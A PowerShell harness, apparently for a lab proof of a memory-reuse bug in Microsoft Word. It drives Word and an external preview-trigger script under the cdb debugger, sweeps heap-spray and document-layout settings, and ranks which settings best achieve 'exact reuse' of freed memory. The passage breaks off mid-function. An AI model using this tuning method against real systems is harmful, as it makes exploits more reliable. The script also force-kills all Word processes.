# ---- Defensive proof harness: exact reuse with marker telemetry ----
param(
    [ValidateSet("telemetry","full")]
    [string]$Mode = "full",

    [ValidateSet("fast","deep","allocdiag")]
    [string]$ObserveMode = "fast",

    [ValidateRange(1,1440)]
    [int]$ObserveMinutes = 30,

    [ValidateRange(1, [int]::MaxValue)]
    [int]$MaxAttempts = 0,

    [ValidateRange(1, [int]::MaxValue)]
    [int]$StartFromAttempt = 1,

    [ValidateRange(1, [int]::MaxValue)]
    [int]$RepeatCount = 1,

    [ValidateScript({ $_ -ge 1 })]
    [int[]]$TableCountsOverride = @(),

    [ValidateScript({ $_ -ge 0 })]
    [int[]]$SprayCountsOverride = @(),

    [string]$AttemptSummaryPath = "",

    [string]$RankingPath = "",

    [switch]$AnalyzeLogs,

    [switch]$LogMemoryMetrics,

    [switch]$DryRunPlan,

    [switch]$KeepArtifactsOnFailure,

    [switch]$CleanArtifactsOnSuccess,

    [switch]$StopOnFirstRootCause,

    [switch]$AllowKillingExistingWord,

    [switch]$IUnderstandThisKillsWord,

    [ValidateRange(1,1440)]
    [int]$HeartbeatMinutes = 5,

    [ValidateRange(0,10000)]
    [int]$PostPayloadAllocTraceCount = 0,

    [ValidateRange(0,1000)]
    [int]$PostPayloadAllocStackCount = 3,

    [string]$EffectiveConfigPath = ""
)

$ErrorActionPreference = "Stop"

$projectDir = $PSScriptRoot
$scriptDir = Join-Path $projectDir "scripts"
$resultDir = Join-Path $projectDir "results"
$docDir = Join-Path $projectDir "docs"
$sourceTrigger = Join-Path $projectDir "tools\preview\Invoke-PreviewTrigger.ps1"
$cdb = "C:\Program Files (x86)\Windows Kits\10\Debuggers\x64\cdb.exe"

New-Item -ItemType Directory -Force $scriptDir, $resultDir, $docDir | Out-Null

# ---- Parameter sweep settings, used only in full mode ----
$tableCounts = @(100, 300, 600, 1000, 2000, 5000, 10000)
$useCustomXml = @($true, $false)
$useRpr = @($true, $false)
$orders = @("tables_first", "customXml_first")
$sprayCounts = @(0)   # 0 = no spray; pass -SprayCountsOverride for heavier lab variants.

$activeTableCounts = if ($TableCountsOverride.Count -gt 0) { $TableCountsOverride } else { $tableCounts }
$activeSprayCounts = if ($SprayCountsOverride.Count -gt 0) { $SprayCountsOverride } else { $sprayCounts }
if ($ObserveMode -eq "allocdiag" -and $PostPayloadAllocTraceCount -eq 0) {
    $PostPayloadAllocTraceCount = 100
}
if (-not $AttemptSummaryPath) {
    $AttemptSummaryPath = Join-Path $resultDir "attempt-summary.csv"
}
if (-not $RankingPath) {
    $RankingPath = Join-Path $resultDir "attempt-ranking.csv"
}
if (-not $EffectiveConfigPath) {
    $EffectiveConfigPath = Join-Path $resultDir "effective-config.json"
}

# ---- Required local tools ----
if (-not (Test-Path $sourceTrigger)) { throw "Trigger not found: $sourceTrigger. Expected tools\preview\Invoke-PreviewTrigger.ps1." }
if (-not (Test-Path $cdb)) { throw "cdb.exe not found: $cdb" }

function Release-ComObjectQuietly {
    param(
        [object]$ComObject
    )

    if ($null -eq $ComObject) { return }
    try { [System.Runtime.InteropServices.Marshal]::ReleaseComObject($ComObject) | Out-Null } catch { }
}

function New-WordApplicationWithRetry {
    param(
        [int]$MaxTries = 6
    )

    for ($wordTry = 1; $wordTry -le $MaxTries; $wordTry++) {
        try {
            return New-Object -ComObject Word.Application
        } catch {
            Write-Host "[!] Word.Application COM start failed attempt $wordTry/${MaxTries}: $($_.Exception.Message)" -ForegroundColor Yellow
            Get-Process WINWORD -ErrorAction SilentlyContinue | Stop-Process -Force -ErrorAction SilentlyContinue
            cmd.exe /c "taskkill /f /t /im winword.exe >nul 2>nul"
            Start-Sleep -Seconds 10
        }
    }

    throw "Failed to create Word.Application COM after retries"
}

function Invoke-PreflightCheck {
    param(
        [bool]$AllowsExistingWord
    )

    $existingWord = @(Get-Process WINWORD -ErrorAction SilentlyContinue)
    if ($existingWord.Count -gt 0 -and -not $AllowsExistingWord) {
        $existingWord | Select-Object Id,ProcessName,StartTime,Path | Format-Table -AutoSize
        throw "Preflight failed: WINWORD is already running. Use -AllowKillingExistingWord in a clean lab VM."
    }

    if (-not (Test-Path $sourceTrigger)) { throw "Preflight failed: trigger script missing: $sourceTrigger" }
    if (-not (Test-Path $cdb)) { throw "Preflight failed: cdb.exe missing: $cdb" }

    $drive = Get-PSDrive -Name ([System.IO.Path]::GetPathRoot($projectDir).Substring(0,1)) -ErrorAction SilentlyContinue
    if ($drive -and $drive.Free -lt 2GB) {
        throw "Preflight failed: less than 2GB free on project drive"
    }
}

function Get-WordProcessMetrics {
    param(
        [int]$ProcessId
    )

    $metrics = [pscustomobject]@{
        ProcessId    = $ProcessId
        PrivateBytes = 0
        WorkingSet   = 0
        VirtualBytes = 0
        Handles      = 0
    }

    if ($ProcessId -le 0) { return $metrics }

    $process = Get-Process -Id $ProcessId -ErrorAction SilentlyContinue
    if ($null -eq $process) { return $metrics }

    return [pscustomobject]@{
        ProcessId    = $process.Id
        PrivateBytes = $process.PrivateMemorySize64
        WorkingSet   = $process.WorkingSet64
        VirtualBytes = $process.VirtualMemorySize64
        Handles      = $process.HandleCount
    }
}

function Write-WordMemoryMetrics {
    param(
        [string]$Label,
        [int]$ProcessId
    )

    if (-not $LogMemoryMetrics) { return }

    $metrics = Get-WordProcessMetrics -ProcessId $ProcessId
    Write-Host ("[MemoryMetrics] Label={0} PID={1} WorkingSet64={2} PrivateMemorySize64={3} VirtualMemorySize64={4} Handles={5}" -f `
        $Label,
        $metrics.ProcessId,
        $metrics.WorkingSet,
        $metrics.PrivateBytes,
        $metrics.VirtualBytes,
        $metrics.Handles) -ForegroundColor DarkCyan
}

function Get-AttemptPlan {
    $plannedAttempts = New-Object System.Collections.Generic.List[object]
    $attemptId = 0

    foreach ($tables in $activeTableCounts) {
        foreach ($custom in $useCustomXml) {
            foreach ($rpr in $useRpr) {
                foreach ($order in $orders) {
                    foreach ($spray in $activeSprayCounts) {
                        for ($repeat = 1; $repeat -le $RepeatCount; $repeat++) {
                            $attemptId++
                            if ($attemptId -lt $StartFromAttempt) { continue }
                            if ($MaxAttempts -gt 0 -and (($attemptId - $StartFromAttempt + 1) -gt $MaxAttempts)) { continue }

                            [void]$plannedAttempts.Add([pscustomobject]@{
                                AttemptId   = $attemptId
                                RepeatIndex = $repeat
                                Tables      = $tables
                                CustomXml   = $custom
                                Rpr         = $rpr
                                Order       = $order
                                SprayCount  = $spray
                            })
                        }
                    }
                }
            }
        }
    }

    return $plannedAttempts
}

function Write-DryRunPlan {
    $plannedAttempts = @(Get-AttemptPlan)
    Write-Host "[DRY_RUN_PLAN] Mode=$Mode ObserveMode=$ObserveMode ObserveMinutes=$ObserveMinutes"
    Write-Host "[DRY_RUN_PLAN] Attempts=$($plannedAttempts.Count) MaxRuntimeMinutes=$($plannedAttempts.Count * $ObserveMinutes)"
    $plannedAttempts | Format-Table -AutoSize
}

function Write-EffectiveConfig {
    param(
        [string]$Path
    )

    $config = [pscustomobject]@{
        Timestamp          = (Get-Date -Format o)
        ProjectDir         = $projectDir
        Mode               = $Mode
        ObserveMode        = $ObserveMode
        ObserveMinutes     = $ObserveMinutes
        MaxAttempts        = $MaxAttempts
        StartFromAttempt   = $StartFromAttempt
        RepeatCount        = $RepeatCount
        ActiveTableCounts  = $activeTableCounts
        ActiveSprayCounts  = $activeSprayCounts
        PostPayloadAllocTraceCount = $PostPayloadAllocTraceCount
        PostPayloadAllocStackCount = $PostPayloadAllocStackCount
        AttemptSummaryPath = $AttemptSummaryPath
        RankingPath        = $RankingPath
        CdbPath            = $cdb
        CdbHash            = if (Test-Path $cdb) { (Get-FileHash $cdb -Algorithm SHA256).Hash } else { "" }
        RunProofHash       = (Get-FileHash (Join-Path $projectDir "run-proof.ps1") -Algorithm SHA256).Hash
        TriggerHash        = if (Test-Path $sourceTrigger) { (Get-FileHash $sourceTrigger -Algorithm SHA256).Hash } else { "" }
        OsVersion          = [System.Environment]::OSVersion.VersionString
        PowerShellVersion  = $PSVersionTable.PSVersion.ToString()
    }

    $directory = Split-Path -Parent $Path
    if ($directory) { New-Item -ItemType Directory -Force $directory | Out-Null }
    $config | ConvertTo-Json -Depth 6 | Set-Content -Path $Path -Encoding ASCII
}

function Write-DiagnosticBundle {
    param(
        [string]$Directory,
        [int]$AttemptId,
        [string]$AttachOut,
        [string]$AttachErr,
        [string]$CdbLog,
        [string]$AttachTrace = "",
        [string]$TriggerOut = "",
        [string]$TriggerErr = "",
        [string]$CdbCommandPath = ""
    )

    New-Item -ItemType Directory -Force $Directory | Out-Null
    $bundlePath = Join-Path $Directory ("diagnostic-attempt-{0:0000}.txt" -f $AttemptId)
    @(
        "Timestamp=$(Get-Date -Format o)"
        "AttemptId=$AttemptId"
        "AttachOut=$AttachOut"
        "AttachErr=$AttachErr"
        "AttachTrace=$AttachTrace"
        "TriggerOut=$TriggerOut"
        "TriggerErr=$TriggerErr"
        "CdbCommandPath=$CdbCommandPath"
        "CdbLog=$CdbLog"
        "Processes:"
    ) | Set-Content -Path $bundlePath -Encoding ASCII

    Get-Process WINWORD,cdb,powershell -ErrorAction SilentlyContinue |
        Select-Object Id,ProcessName,StartTime,Path |
        Format-Table -AutoSize | Out-String |
        Add-Content -Path $bundlePath -Encoding ASCII

    foreach ($entry in @(
        @("attach stdout", $AttachOut),
        @("attach stderr", $AttachErr),
        @("attach trace", $AttachTrace),
        @("preview-trigger stdout", $TriggerOut),
        @("preview-trigger stderr", $TriggerErr),
        @("cdb command", $CdbCommandPath),
        @("cdb log", $CdbLog)
    )) {
        Add-Content -Path $bundlePath -Value "`n=== $($entry[0]) tail ===" -Encoding ASCII
        if ($entry[1] -and (Test-Path $entry[1])) {
            Get-Content $entry[1] -Tail 120 | Add-Content -Path $bundlePath -Encoding ASCII
        } else {
            Add-Content -Path $bundlePath -Value "[missing] $($entry[1])" -Encoding ASCII
        }
    }
}

function Write-RuntimeEventSummary {
    param(
        [string]$CdbLog,
        [int]$LineCount = 80
    )

    if (-not (Test-Path $CdbLog)) {
        Write-Host "[RuntimeSummary] CDB log missing: $CdbLog" -ForegroundColor Yellow
        return
    }

    $runtimeEvents = Get-Content $CdbLog -ErrorAction SilentlyContinue | Where-Object {
        $_ -match '\[CDB_' -and
        $_ -notmatch '^\s*0:\d+>' -and
        $_ -notmatch '^CDB PROOF' -and
        $_ -notmatch 'bu\s+(wwlib|ntdll)' -and
        $_ -notmatch '\.echo'
    }

    Write-Host "`n=== RUNTIME EVENT SUMMARY ===" -ForegroundColor DarkCyan
    if (-not $runtimeEvents) {
        Write-Host "[RuntimeSummary] no runtime CDB events captured" -ForegroundColor Yellow
        return
    }

    $runtimeEvents |
        ForEach-Object {
            if ($_ -match '\[(CDB_[^\]\s]+)\]') { $Matches[1] }
        } |
        Group-Object |
        Sort-Object Count -Descending |
        Format-Table Count,Name -AutoSize

    Write-Host "`n=== RUNTIME EVENT TAIL ===" -ForegroundColor DarkCyan
    $runtimeEvents | Select-Object -Last $LineCount | ForEach-Object { Write-Host $_ }
}

function Remove-AttemptArtifacts {
    param(
        [string[]]$Paths
    )

    foreach ($path in $Paths) {
        if ($path -and (Test-Path $path)) {
            Remove-Item -LiteralPath $path -Force -ErrorAction SilentlyContinue
        }
    }
}

function Write-LogTail {
    param(
        [string]$Path,
        [string]$Label,
        [int]$LineCount = 80
    )

    Write-Host "`n=== $Label ===" -ForegroundColor DarkCyan
    if (-not (Test-Path $Path)) {
        Write-Host "[missing] $Path" -ForegroundColor Yellow
        return
    }

    Get-Content $Path -Tail $LineCount -ErrorAction SilentlyContinue |
        ForEach-Object { Write-Host $_ }
}

function Write-ProcessSnapshot {
    param(
        [System.Diagnostics.Process]$AttachProcess
    )

    Write-Host "`n=== PROCESS SNAPSHOT ===" -ForegroundColor DarkCyan
    if ($null -ne $AttachProcess) {
        Write-Host ("attach-helper: Id={0} HasExited={1}" -f $AttachProcess.Id, $AttachProcess.HasExited)
    } else {
        Write-Host "attach-helper: not started"
    }

    Get-Process cdb,WINWORD -ErrorAction SilentlyContinue |
        Select-Object Id,ProcessName,StartTime,Path |
        Format-Table -AutoSize
}

function Stop-AttemptProcess {
    param(
        [System.Diagnostics.Process]$Process
    )

    if ($null -eq $Process) { return }

    try {
        if (-not $Process.HasExited) {
            Stop-Process -Id $Process.Id -Force -ErrorAction SilentlyContinue
        }
    } catch { }
}

# Lab-only global cleanup: this intentionally terminates all WINWORD/cdb instances to avoid dirty proof state.
function Cleanup-AttemptProcesses {
    param(
        [System.Diagnostics.Process]$TriggerProcess,
        [System.Diagnostics.Process]$AttachProcess
    )

    Write-Host "[*] Cleanup WINWORD/CDB..." -ForegroundColor DarkGray
    $cleanupDeadline = (Get-Date).AddSeconds(90)
    $leftoverWord = $null

    do {
        Stop-AttemptProcess -Process $TriggerProcess
        Stop-AttemptProcess -Process $AttachProcess

        Get-Process cdb -ErrorAction SilentlyContinue |
            Stop-Process -Force -ErrorAction SilentlyContinue

        $wordProcs = Get-Process WINWORD -ErrorAction SilentlyContinue
        foreach ($wp in $wordProcs) {
            try { Stop-Process -Id $wp.Id -Force -ErrorAction SilentlyContinue } catch { }
            cmd.exe /c "taskkill /f /t /pid $($wp.Id) >nul 2>nul"
        }

        cmd.exe /c "taskkill /f /t /im winword.exe >nul 2>nul"
        Start-Sleep -Seconds 3

        $leftoverWord = Get-Process WINWORD -ErrorAction SilentlyContinue
    } while ($leftoverWord -and (Get-Date) -lt $cleanupDeadline)

    if ($leftoverWord) {
        Write-Host "[-] WINWORD still alive after 90s cleanup retry; aborting to avoid dirty proof state." -ForegroundColor Red
        $leftoverWord | Select-Object Id,ProcessName,StartTime,Path | Format-Table -AutoSize
        throw "WINWORD cleanup failed after retry"
    }
}

function Get-TargetWordProcessId {
    param(
        [int[]]$BaselineWordPids
    )

    $wordProcesses = @(Get-Process WINWORD -ErrorAction SilentlyContinue)
    $newWordProcesses = @($wordProcesses | Where-Object { $BaselineWordPids -notcontains $_.Id })

    if ($newWordProcesses.Count -gt 1) {
        Write-Host "[!] Multiple new WINWORD processes detected; selecting newest." -ForegroundColor Yellow
        return ($newWordProcesses | Sort-Object StartTime -Descending | Select-Object -First 1).Id
    }

    if ($newWordProcesses.Count -eq 1) {
        return $newWordProcesses[0].Id
    }

    if ($wordProcesses.Count -eq 1) {
        Write-Host "[!] No new WINWORD PID detected; falling back to the only running WINWORD." -ForegroundColor Yellow
        return $wordProcesses[0].Id
    }

    Write-Host "[!] No unique WINWORD target. Current WINWORD processes:" -ForegroundColor Yellow
    $wordProcesses | Select-Object Id,ProcessName,StartTime,Path | Format-Table -AutoSize
    throw "WINWORD PID not found"
}

function Write-AttachDiagnostics {
    param(
        [System.Diagnostics.Process]$AttachProcess,
        [string]$AttachOut,
        [string]$AttachErr,
        [string]$CdbLog,
        [string]$AttachTrace = ""
    )

    if ($null -ne $AttachProcess) {
        $exitCode = if ($AttachProcess.HasExited) { $AttachProcess.ExitCode } else { "running" }
        Write-Host ("attach-helper ExitCode={0} HasExited={1}" -f $exitCode, $AttachProcess.HasExited) -ForegroundColor Yellow
    }

    Write-LogTail -Path $AttachOut -Label "attach-helper stdout tail"
    Write-LogTail -Path $AttachErr -Label "attach-helper stderr tail"
    Write-LogTail -Path $AttachTrace -Label "attach-helper trace tail"
    Write-LogTail -Path $CdbLog -Label "cdb log tail"
}

function Write-PreviewTriggerDiagnostics {
    param(
        [System.Diagnostics.Process]$TriggerProcess,
        [string]$TriggerOut,
        [string]$TriggerErr
    )

    if ($null -ne $TriggerProcess) {
        $TriggerProcess.Refresh()
        $exitCode = if ($TriggerProcess.HasExited) { $TriggerProcess.ExitCode } else { "running" }
        Write-Host ("preview-trigger ExitCode={0} HasExited={1}" -f $exitCode, $TriggerProcess.HasExited) -ForegroundColor Yellow
    }

    Write-LogTail -Path $TriggerOut -Label "preview-trigger stdout tail"
    Write-LogTail -Path $TriggerErr -Label "preview-trigger stderr tail"
}

function Test-HasAttachStartupEvidence {
    param(
        [string[]]$Paths
    )

    foreach ($path in $Paths) {
        if (-not $path -or -not (Test-Path $path)) { continue }
        if ((Get-Item -LiteralPath $path -ErrorAction SilentlyContinue).Length -gt 0) {
            return $true
        }
    }

    return $false
}

function Test-IsCdbReadyLine {
    param(
        [string]$Line
    )

    return (
        $Line -match '^\s*\[CDB_READY_FLAG\]\s*$' -and
        $Line -notmatch '^\s*0:\d+>' -and
        $Line -notmatch '\.echo'
    )
}

function Get-CdbReadyLines {
    param(
        [string[]]$Paths
    )

    $readyLines = New-Object System.Collections.Generic.List[string]
    foreach ($path in $Paths) {
        if (-not $path -or -not (Test-Path $path)) { continue }

        Get-Content $path -ErrorAction SilentlyContinue | Where-Object {
            Test-IsCdbReadyLine -Line $_
        } | ForEach-Object {
            [void]$readyLines.Add($_)
        }
    }

    return $readyLines
}

function Write-AttemptSummary {
    param(
        [string]$Path,
        [int]$Attempt,
        [int]$RepeatIndex = 1,
        [int]$Tables,
        [bool]$CustomXml,
        [bool]$Rpr,
        [string]$Order,
        [int]$SprayCount,
        [string]$Status,
        [string]$LogPath = "",
        [string]$DocPath = "",
        [string]$CdbCommandPath = "",
        [string]$TriggerOut = "",
        [string]$TriggerErr = "",
        [string]$AttachOut = "",
        [string]$AttachErr = "",
        [string]$AttachTrace = "",
        [string]$ErrorMessage = "",
        [string]$FailureKind = "",
        [double]$DurationSeconds = 0,
        [int]$SprayCompleted = 0,
        [bool]$HasBadCleanup = $false,
        [bool]$HasBorrowedDOD = $false,
        [bool]$HasPayloadRelease = $false,
        [bool]$HasExactReuseRuntime = $false,
        [bool]$HasWatchHit = $false,
        [bool]$MarkerFound = $false,
        [Int64]$WordPrivateBytesBeforeSpray = 0,
        [Int64]$WordPrivateBytesAfterSpray = 0,
        [Int64]$WordWorkingSetBeforeSpray = 0,
        [Int64]$WordWorkingSetAfterSpray = 0,
        [Int64]$WordVirtualBytesBeforeSpray = 0,
        [Int64]$WordVirtualBytesAfterSpray = 0,
        [double]$SprayDurationSeconds = 0,
        [double]$SprayTablesPerSecond = 0,
        [string]$PreviewInitializeHr = "",
        [string]$PreviewTriggerExitCode = "",
        [string]$PreviewTriggerHasExited = "",
        [int]$PostPayloadAlloc20Count = 0,
        [string]$FirstPostPayloadAlloc20Delta = "",
        [string]$LastPostPayloadAlloc20Delta = "",
        [string]$ClosestPostPayloadAlloc20Delta = "",
        [string]$PostPayloadAllocSummary = "",
        [string]$BestPostPayloadAllocSize = "",
        [string]$BestPostPayloadAllocDelta = "",
        [string]$ClosestPositivePostPayloadAllocDelta = "",
        [string]$ClosestNegativePostPayloadAllocDelta = "",
        [string]$ClosestAbsolutePostPayloadAllocDelta = "",
        [int]$RootCauseToExactReuseLines = 0,
        [int]$ExactReuseToWriteLines = 0
    )

    if (-not $Path) { return }

    $row = [pscustomobject]@{
        Timestamp                    = (Get-Date -Format o)
        Attempt                      = $Attempt
        RepeatIndex                  = $RepeatIndex
        Tables                       = $Tables
        CustomXml                    = $CustomXml
        Rpr                          = $Rpr
        Order                        = $Order
        SprayCount                   = $SprayCount
        SprayCompleted               = $SprayCompleted
        Status                       = $Status
        FailureKind                  = $FailureKind
        DurationSeconds              = [Math]::Round($DurationSeconds, 3)
        HasBadCleanup                = $HasBadCleanup
        HasBorrowedDOD               = $HasBorrowedDOD
        HasPayloadRelease            = $HasPayloadRelease
        HasExactReuseRuntime         = $HasExactReuseRuntime
        HasWatchHit                  = $HasWatchHit
        MarkerFound                  = $MarkerFound
        PostPayloadAlloc20Count      = $PostPayloadAlloc20Count
        FirstPostPayloadAlloc20Delta = $FirstPostPayloadAlloc20Delta
        LastPostPayloadAlloc20Delta  = $LastPostPayloadAlloc20Delta
        ClosestPostPayloadAlloc20Delta = $ClosestPostPayloadAlloc20Delta
        PostPayloadAllocSummary      = $PostPayloadAllocSummary
        BestPostPayloadAllocSize     = $BestPostPayloadAllocSize
        BestPostPayloadAllocDelta    = $BestPostPayloadAllocDelta
        WordPrivateBytesBeforeSpray  = $WordPrivateBytesBeforeSpray
        WordPrivateBytesAfterSpray   = $WordPrivateBytesAfterSpray
        WordWorkingSetBeforeSpray    = $WordWorkingSetBeforeSpray
        WordWorkingSetAfterSpray     = $WordWorkingSetAfterSpray
        WordVirtualBytesBeforeSpray  = $WordVirtualBytesBeforeSpray
        WordVirtualBytesAfterSpray   = $WordVirtualBytesAfterSpray
        SprayDurationSeconds         = [Math]::Round($SprayDurationSeconds, 3)
        SprayTablesPerSecond         = [Math]::Round($SprayTablesPerSecond, 3)
        PreviewInitializeHr          = $PreviewInitializeHr
        PreviewTriggerExitCode       = $PreviewTriggerExitCode
        PreviewTriggerHasExited      = $PreviewTriggerHasExited
        ClosestPositivePostPayloadAllocDelta = $ClosestPositivePostPayloadAllocDelta
        ClosestNegativePostPayloadAllocDelta = $ClosestNegativePostPayloadAllocDelta
        ClosestAbsolutePostPayloadAllocDelta = $ClosestAbsolutePostPayloadAllocDelta
        RootCauseToExactReuseLines   = $RootCauseToExactReuseLines
        ExactReuseToWriteLines       = $ExactReuseToWriteLines
        DocPath                      = $DocPath
        CdbCommandPath               = $CdbCommandPath
        TriggerOut                   = $TriggerOut
        TriggerErr                   = $TriggerErr
        AttachOut                    = $AttachOut
        AttachErr                    = $AttachErr
        AttachTrace                  = $AttachTrace
        LogPath                      = $LogPath
        ErrorMessage                 = $ErrorMessage
    }

    $directory = Split-Path -Parent $Path
    if ($directory) {
        New-Item -ItemType Directory -Force $directory | Out-Null
    }

    if (Test-Path $Path) {
        $currentHeader = @((Import-Csv -Path $Path -Delimiter "," -ErrorAction SilentlyContinue | Select-Object -First 1).PSObject.Properties.Name)
        $expectedHeader = @($row.PSObject.Properties | ForEach-Object { $_.Name })
        $hasSchemaMismatch = $currentHeader.Count -gt 0 -and (
            (Compare-Object -ReferenceObject $expectedHeader -DifferenceObject $currentHeader -SyncWindow 0).Count -gt 0
        )

        if ($hasSchemaMismatch) {
            $backupPath = Join-Path $directory ("attempt-summary-schema-backup-{0}.csv" -f (Get-Date -Format "yyyyMMdd-HHmmss"))
            Move-Item -LiteralPath $Path -Destination $backupPath -Force
            Write-Host "[!] Attempt summary schema changed; old CSV moved to $backupPath" -ForegroundColor Yellow
            $row | Export-Csv -Path $Path -NoTypeInformation
            return
        }
        $row | Export-Csv -Path $Path -NoTypeInformation -Append -Force
    } else {
        $row | Export-Csv -Path $Path -NoTypeInformation
    }
}

function Get-FailureKind {
    param(
        [string]$ErrorMessage
    )

    if ($ErrorMessage -match 'CDB attach helper|CDB ready|cdb') { return "cdb" }
    if ($ErrorMessage -match 'PreviewTrigger|CoCreateInstance') { return "preview-trigger" }
    if ($ErrorMessage -match 'Word\.Application|COM|WINWORD|Word') { return "word-com" }
    if ($ErrorMessage -match 'timeout|timed out') { return "timeout" }
    return "attempt"
}

function Get-PostPayloadAllocSummary {
    param(
        [object[]]$RuntimeEventLines
    )

    function Convert-CdbDelta {
        param([string]$Delta)

        $normalized = ($Delta -replace '[^0-9a-fA-F]', '').PadLeft(16, '0')
        if ($normalized.Length -gt 16) {
            $normalized = $normalized.Substring($normalized.Length - 16)
        }

        $unsignedValue = [Convert]::ToUInt64($normalized, 16)
        $isNegative = $unsignedValue -gt [UInt64][Int64]::MaxValue
        $absoluteValue = if ($isNegative) {
            [Int64](([UInt64]::MaxValue - $unsignedValue) + [UInt64]1)
        } else {
            [Int64]$unsignedValue
        }

        return [pscustomobject]@{
            Text     = $Delta
            Unsigned = $unsignedValue
            Negative = $isNegative
            Absolute = $absoluteValue
        }
    }

    $allAllocEvents = @($RuntimeEventLines | Where-Object {
        $_.Line -match '\[CDB_POST_PAYLOAD_ALLOC_RETURN\]'
    })
    $allocEvents = @($RuntimeEventLines | Where-Object {
        $_.Line -match '\[CDB_POST_PAYLOAD_ALLOC20_RETURN\]'
    })

    if ($allocEvents.Count -eq 0 -and $allAllocEvents.Count -eq 0) {
        return [pscustomobject]@{
            Count        = 0
            FirstDelta   = ""
            LastDelta    = ""
            ClosestDelta = ""
            Summary      = ""
            BestSize     = ""
            BestDelta    = ""
            ClosestPositiveDelta = ""
            ClosestNegativeDelta = ""
            ClosestAbsoluteDelta = ""
        }
    }

    $deltas = @($allocEvents | ForEach-Object {
        if ($_.Line -match 'delta=([0-9a-fA-F`]+)') {
            $Matches[1]
        }
    })
    $parsedDeltas = @($deltas | Where-Object { $_ } | ForEach-Object { Convert-CdbDelta -Delta $_ })
    $allDeltas = @($allAllocEvents | ForEach-Object {
        if ($_.Line -match 'delta=([0-9a-fA-F`]+)') {
            $Matches[1]
        }
    })
    $allParsedDeltas = @($allDeltas | Where-Object { $_ } | ForEach-Object { Convert-CdbDelta -Delta $_ })

    $sizeGroups = @{}
    foreach ($event in $allAllocEvents) {
        $line = $event.Line
        if ($line -notmatch 'size=([0-9a-fA-Fx`]+)') { continue }
        $size = $Matches[1].ToLowerInvariant()
        $delta = if ($line -match 'delta=([0-9a-fA-F`]+)') { $Matches[1] } else { "" }
        if (-not $sizeGroups.ContainsKey($size)) {
            $sizeGroups[$size] = New-Object System.Collections.Generic.List[object]
        }
        if ($delta) {
            [void]$sizeGroups[$size].Add((Convert-CdbDelta -Delta $delta))
        }
    }

    $summaryParts = New-Object System.Collections.Generic.List[string]
    $bestSize = ""
    $bestDelta = $null
    foreach ($size in ($sizeGroups.Keys | Sort-Object)) {
        $sizeDeltas = @($sizeGroups[$size].ToArray())
        $closest = if ($sizeDeltas.Count -gt 0) {
            $sizeDeltas | Sort-Object Absolute | Select-Object -First 1
        } else {
            $null
        }
        $closestText = if ($closest) { $closest.Text } else { "" }
        [void]$summaryParts.Add(("{0}:count={1}:closest={2}" -f $size, $sizeDeltas.Count, $closestText))
        if ($closest -and (($null -eq $bestDelta) -or $closest.Absolute -lt $bestDelta.Absolute)) {
            $bestSize = $size
            $bestDelta = $closest
        }
    }

    return [pscustomobject]@{
        Count        = $allocEvents.Count
        FirstDelta   = if ($deltas.Count -gt 0) { $deltas[0] } else { "" }
        LastDelta    = if ($deltas.Count -gt 0) { $deltas[$deltas.Count - 1] } else { "" }
        ClosestDelta = if ($deltas.Count -gt 0) { ($deltas | Sort-Object Length, { $_ } | Select-Object -First 1) } else { "" }
        Summary      = ($summaryParts -join ";")
        BestSize     = $bestSize
        BestDelta    = if ($bestDelta) { $bestDelta.Text } else { "" }
        ClosestPositiveDelta = if ($allParsedDeltas.Count -gt 0) { @($allParsedDeltas | Where-Object { -not $_.Negative } | Sort-Object Absolute | Select-Object -First 1).Text } else { "" }
        ClosestNegativeDelta = if ($allParsedDeltas.Count -gt 0) { @($allParsedDeltas | Where-Object { $_.Negative } | Sort-Object Absolute | Select-Object -First 1).Text } else { "" }
        ClosestAbsoluteDelta = if ($allParsedDeltas.Count -gt 0) { @($allParsedDeltas | Sort-Object Absolute | Select-Object -First 1).Text } else { "" }
    }
}

function Write-AttemptRanking {
    param(
        [string]$SummaryPath,
        [string]$RankingPath
    )

    if (-not $SummaryPath -or -not $RankingPath -or -not (Test-Path $SummaryPath)) { return }

    $rows = @(Import-Csv -Path $SummaryPath)
    if ($rows.Count -eq 0) { return }

    $rankedRows = $rows |
        Group-Object Tables,CustomXml,Rpr,Order,SprayCount |
        ForEach-Object {
            $groupRows = @($_.Group)
            $attemptCount = $groupRows.Count
            $exactReuseCount = @($groupRows | Where-Object { $_.HasExactReuseRuntime -eq "True" }).Count
            $watchHitCount = @($groupRows | Where-Object { $_.HasWatchHit -eq "True" }).Count
            $markerFoundCount = @($groupRows | Where-Object { $_.MarkerFound -eq "True" }).Count
            $successCount = @($groupRows | Where-Object { $_.Status -eq "success" }).Count
            $failureCount = @($groupRows | Where-Object { $_.Status -eq "failed" }).Count
            $first = $groupRows[0]
            $score = ($successCount * 100) + ($markerFoundCount * 25) + ($watchHitCount * 10) + ($exactReuseCount * 5) - ($failureCount * 3)

            [pscustomobject]@{
                Tables          = [int]$first.Tables
                CustomXml       = [bool]::Parse($first.CustomXml)
                Rpr             = [bool]::Parse($first.Rpr)
                Order           = $first.Order
                SprayCount      = [int]$first.SprayCount
                Attempts        = $attemptCount
                ExactReuseRate  = [Math]::Round($exactReuseCount / [double]$attemptCount, 3)
                WatchHitRate    = [Math]::Round($watchHitCount / [double]$attemptCount, 3)
                MarkerFoundRate = [Math]::Round($markerFoundCount / [double]$attemptCount, 3)
                SuccessRate     = [Math]::Round($successCount / [double]$attemptCount, 3)
                FailureRate     = [Math]::Round($failureCount / [double]$attemptCount, 3)
                Score           = $score
            }
        } |
        Sort-Object Score,SuccessRate,MarkerFoundRate,WatchHitRate,ExactReuseRate -Descending

    $directory = Split-Path -Parent $RankingPath
    if ($directory) {
        New-Item -ItemType Directory -Force $directory | Out-Null
    }

    $rankedRows | Export-Csv -Path $RankingPath -NoTypeInformation
    Write-Host "[*] Attempt ranking written: $RankingPath" -ForegroundColor Cyan
}

function Show-AttemptLogAnalysis {
    param(
        [string]$SummaryPath,
        [string]$RankingPath
    )

    if (-not (Test-Path $SummaryPath)) {
        Write-Host "[!] Attempt summary not found: $SummaryPath" -ForegroundColor Yellow
        return
    }

    $rows = @(Import-Csv -Path $SummaryPath)
    if ($rows.Count -eq 0) {
        Write-Host "[!] Attempt summary is empty: $SummaryPath" -ForegroundColor Yellow
        return
    }

    Write-AttemptRanking -SummaryPath $SummaryPath -RankingPath $RankingPath

    $analysisRows = $rows | ForEach-Object {
        $hasExactReuse = if ($_.PSObject.Properties.Name -contains "HasExactReuseRuntime") {
            $_.HasExactReuseRuntime
        } elseif ($_.PSObject.Properties.Name -contains "HasExactReuse") {
            $_.HasExactReuse
        } else {
            ""
        }

        [pscustomobject]@{
            Attempt              = $_.Attempt
            Tables               = $_.Tables
            CustomXml            = $_.CustomXml
